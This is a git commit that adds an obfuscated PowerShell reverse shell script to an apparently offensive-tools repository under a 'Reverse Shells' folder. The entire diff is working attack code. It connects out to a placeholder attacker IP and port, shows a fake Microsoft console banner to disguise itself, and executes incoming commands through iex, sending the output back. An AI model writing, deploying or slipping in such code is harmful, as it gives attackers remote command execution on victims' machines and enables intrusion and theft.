efd896b2d38823210a0d73239d11907f46fd10ca
H3ll_Ka1ser <98783688+H3llKa1ser@users.noreply.github.com>
2025-05-17 15:32:48 +0300

    Create PowershellObfReverseTCP.ps1

---
+++ Miscellaneous /Reverse Shells/PowershellObfReverseTCP.ps1
@@ -0,0 +1,14 @@
+$c = New-Object System.Net.Sockets.TCPClient(<IP>,<Port>);
+$I = $c.GetStream();
+[byte[]]$U = 0..(2-shl15)|%{0};
+$U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n")
+$I.Write($U,0,$U.Length)
+$U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
+$I.Write($U,0,$U.Length)
+while(($k = $I.Read($U, 0, $U.Length)) -ne 0){;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
+$a = (iex $D 2>&1 | Out-String );
+$r  = $a + (pwd).Path + '> ';
+$m = ([text.encoding]::ASCII).GetBytes($r);
+$I.Write($m,0,$m.Length);
+$I.Flush()};
+$c.Close()
